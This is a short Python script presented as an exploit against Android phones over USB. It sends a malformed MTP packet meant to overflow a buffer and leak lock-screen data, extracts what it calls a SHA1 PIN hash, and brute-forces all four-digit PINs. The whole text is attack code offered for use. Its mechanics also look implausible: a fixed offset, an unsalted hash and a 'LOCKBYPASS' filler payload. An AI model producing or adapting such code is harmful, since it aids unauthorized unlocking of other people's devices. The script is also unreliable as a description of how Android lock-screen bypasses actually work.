import usb.core
import usb.util
import hashlib
import struct

# MTP Exploit Payload
def build_malicious_mtp_packet():
    # Craft invalid MTP header with oversized payload
    header = struct.pack('<IHH', 0xFFFFFFFF, 0x0000, 0x0000)  # Corrupted length
    payload = b'\x4C\x4F\x43\x4B\x42\x59\x50\x41\x53\x53' * 100  # Trigger buffer overflow
    return header + payload

def extract_pin_hash(device):
    try:
        # Claim MTP interface
        usb.util.claim_interface(device, 2)
        
        # Send malicious MTP packet
        device.write(2, build_malicious_mtp_packet(), timeout=5000)
        
        # Read leaked locksettings.db fragment
        data = device.read(0x82, 1024, timeout=5000)
        pin_hash = data[16:32]  # Extract SHA1 hash
        
        return pin_hash
    except Exception as e:
        print(f"[!] Exploit failed: {str(e)}")
        return None

def bruteforce_pin(target_hash):
    for pin in range(0, 10000):
        test_hash = hashlib.sha1(str(pin).zfill(4).encode()).digest()
        if test_hash == target_hash:
            return pin
    return None

# Main execution
device = usb.core.find(idVendor=0x18d1)  # Android USB VID
if device:
    pin_hash = extract_pin_hash(device)
    if pin_hash:
        print(f"[*] Extracted PIN hash: {pin_hash.hex()}")
        pin = bruteforce_pin(pin_hash)
        print(f"[+] Cracked PIN: {pin if pin else 'Not found'}")
else:
    print("[!] No Android device detected in MTP mode")